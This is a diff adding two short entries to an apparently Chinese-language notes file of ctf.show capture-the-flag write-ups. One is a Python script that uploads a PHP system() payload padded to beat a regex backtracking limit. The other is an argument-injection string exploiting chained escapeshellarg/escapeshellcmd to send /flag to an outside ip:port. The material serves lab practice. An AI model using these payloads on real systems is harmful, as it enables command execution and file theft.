@@ -68,6 +68,29 @@ if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
 > 在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。
 
 
+### web685
+正则回溯绕过限制
+
+```python
+import requests
+file={
+"file":'<?php system("cat /secret_you_never_know");?>'+'a'*1000000
+}
+result=requests.post("http://225d3eda-6fc1-4a28-b98c-e07b5f2c25fa.challenge.ctf.show/",files=file)
+print(result.content)
+
+```
+
+### web688
+命令执行
+```php
+$url=escapeshellarg($url);
+$url=escapeshellcmd($url);
+```
+> escapeshellarg和escapeshellcmd两个函数连用会产生一些问题
+
+`url=http://ip:port/' -F file=@/flag '`
+
 ## 菜狗杯
 
 ### 算力升级
